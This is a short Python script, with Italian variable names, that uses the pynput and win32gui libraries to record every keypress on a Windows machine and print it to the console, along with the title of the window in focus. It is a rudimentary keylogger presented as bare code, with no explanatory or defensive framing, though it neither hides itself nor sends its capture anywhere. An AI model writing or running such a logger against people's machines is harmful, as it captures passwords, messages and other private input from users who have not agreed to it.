from pynput.keyboard import Key, Listener #pip install pynput
import win32gui

vecchio_titolo = ""
w = win32gui
def on_press(key):
    titolo = w.GetWindowText (w.GetForegroundWindow())
    global vecchio_titolo
    if vecchio_titolo != titolo:
        vecchio_titolo = titolo
        print(f'[*] WINDOW: {titolo}')
    print(f'[*] KEY: {key}')

with Listener(on_press=on_press) as listener:
    listener.join()